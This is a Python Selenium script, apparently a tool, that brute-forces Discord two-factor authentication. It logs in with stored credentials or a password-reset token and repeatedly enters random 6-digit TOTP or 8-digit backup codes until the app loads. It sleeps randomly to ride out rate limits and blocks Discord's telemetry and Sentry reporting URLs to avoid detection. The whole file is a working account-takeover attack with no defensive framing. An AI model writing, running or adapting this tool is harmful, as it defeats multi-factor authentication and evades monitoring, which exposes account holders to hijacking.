# Import dependencies and libraries
import os
import time
import secrets
from dotenv import load_dotenv, find_dotenv
from lib.codegen import genNormal, genBackup
from lib.textcolor import toColor

# Import Selenium libraries and dependencies
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

# Load in the credentials from .env
load_dotenv(find_dotenv())

# Set the email and password variables from the environment variables
email = os.getenv('EMAIL')
password = os.getenv('PASSWORD')
token = os.getenv('TOKEN')
newpassword = os.getenv('NEWPASSWORD')

def main(mode,code):
	# Chromium oprions.
	options = Options()
	options.add_argument('--log-level=1')
	options.add_experimental_option("excludeSwitches", ["enable-logging"])
	# Sets what page to use.
	match mode:
		case "OTP":
			# OTP login
			dispage = "https://www.discord.com/login"
		case "PR":
			# Password reset page
			options.add_argument('--headless')
			dispage = "https://discord.com/reset#token=" + token
		case _:
			print(toColor("ERROR","red") + ": Set Page")
	# Get the Chromium web driver
	driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
	#Blocking cloudflare and discord science URLS so they don't phone home
	driver.execute_cdp_cmd('Network.setBlockedURLs', {
		"urls": [
			"a.nel.cloudflare.com/report", 
			"https://discord.com/api/v9/science",
			"sentry.io"
		]
	})
	# Enable the network connectivity of the browser
	driver.execute_cdp_cmd('Network.enable', {})
	# Go to the discord page
	driver.get(dispage)
	# Wait 1 second before typing the email and password
	time.sleep(1)
	match mode:
		case "OTP":
			# Find the email and password login fields
			loginEmail = driver.find_element(by=By.NAME, value="email")
			loginPassword = driver.find_element(by=By.NAME, value="password")
			# Enter the email and password
			loginEmail.send_keys(email)
			loginPassword.send_keys(password)
			# TOTP login field location
			element = "//*[@aria-label='Enter Discord Auth/Backup Code']"
		case "PR":
			# Find the new password field
			loginPassword = driver.find_element(by=By.NAME, value="password")
			# Enter the new password
			loginPassword.send_keys(newpassword)
			# Password reset field location
			element = "/html/body/div[2]/div[2]/div[1]/div[1]/div/div/div/form/div[2]/div[2]/div/div/input"
		case _:
			print(toColor("ERROR","red") + ": Set Mode")

	# Click Enter/Return to enter the password
	loginPassword.send_keys(Keys.RETURN)
	# Set up the statistics variables
	totpCount = 0
	ratelimitCount = 0

	# Sets the code generate mode and the ammount of charaters to backspace from previously entered TOTP code.
	match code:
		case 6:
			clear = 6
			gen = genNormal
		case 8:
			clear = 9
			gen = genBackup
		case _:
			print(toColor("ERROR","red") + ": Code Generate Mode")

	#loginTOTP = otp input field. TOTP stands for Timed One Time Password
	# Constantly run the script
	while (True):
		# Attempt to find the TOTP login field
		try:
			loginTOTP = driver.find_element(by=By.XPATH, value=element)
			time.sleep(0.5)
			start = time.time()
			sleepy = 0

			#Logic to continuously enter OTP codes
			while (True):
				# Inform user TOTP field was found
				if totpCount == 0:
					print("TOTP login field: " + toColor("Found","green"))
					print("Forcer: " + toColor("Starting","green"))

				# Generate a new 8 or 6 digit number and enter it into the TOTP field
				totp = gen(1)
				loginTOTP.send_keys(totp)
				loginTOTP.send_keys(Keys.RETURN)
				totpCount += 1
				
				#Test for ratelimit
				if ("The resource is being rate limited." in driver.page_source):
					print(toColor("Ratelimited.", "yellow"))
					sleepy = secrets.choice(range(7, 12))
					ratelimitCount += 1

				# This means the password token has expired
				elif ("Token has expired" in driver.page_source):
					#  Print this out as well as some statistics, and prompt the user to retry.
					elapsed = time.time() - start
					print(toColor("Invalid session ticket.", "red"))
					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
					# Close the browser.
					driver.close()
				
				elif ("Invalid two-factor auth ticket" in driver.page_source):
					# This means that Discord has expired this login session.
					#  Print this out as well as some statistics, and prompt the user to retry.
					elapsed = time.time() - start
					print(toColor("Invalid session ticket.", "red"))
					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
					# Close the browser.
					driver.close()
					time.sleep(1)
					main(mode,code)
				# The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
				else:
					sleepy = secrets.choice(range(6, 10))
				#Testing if the main app UI renders.
				try:
					# Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
					time.sleep(1)
					loginTest = driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")
					print(toColor(f"Code {totp} worked!"))
					break
				except NoSuchElementException:
					# This means that the login was unsuccessful so let's inform the user and wait.
					print("Code: " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
					time.sleep(sleepy)
					# Backspace the previously entered TOTP code.
					for i in range(clear):
						loginTOTP.send_keys(Keys.BACKSPACE)

				# If the TOTP login field is not found (e.g the user hasn't completed the Captcha/entered a new password, then try again
		except (NoSuchElementException):
			pass

if __name__ == "__main__":
	# Ask the user what they want to do
	try:
		menu = int(input(toColor("Are you trying a password reset?\n[1] - Yes\n[2] - No\n ", "blue")))
		match menu:
			case 1:
				mode = "PR"
				t = int(input(toColor("What type of code would you like to generate?\n[1] - 8 Digit Backup Code\n[2] - 6 Digit Normal Code\n ", "blue")))
				match t:
					case 1:
						code = 8
					case 2:
						code = 6
					case _:
						print("Invalid option entered!")	
				main(mode,code)			
			case 2:
				mode = "OTP"
				t = int(input(toColor("What type of code would you like to generate?\n[1] - 8 Digit Backup Code\n[2] - 6 Digit Normal Code\n ", "blue")))
				match t:
					case 1:
						code = 8
					case 2:
						code = 6
					case _:
						print("Invalid option entered!")
				main(mode,code)	
			case _:
				print("Invalid option entered!")
			
	except BaseException as ex:
		if isinstance(ex, SystemExit) or isinstance(ex, KeyboardInterrupt):
				quit()
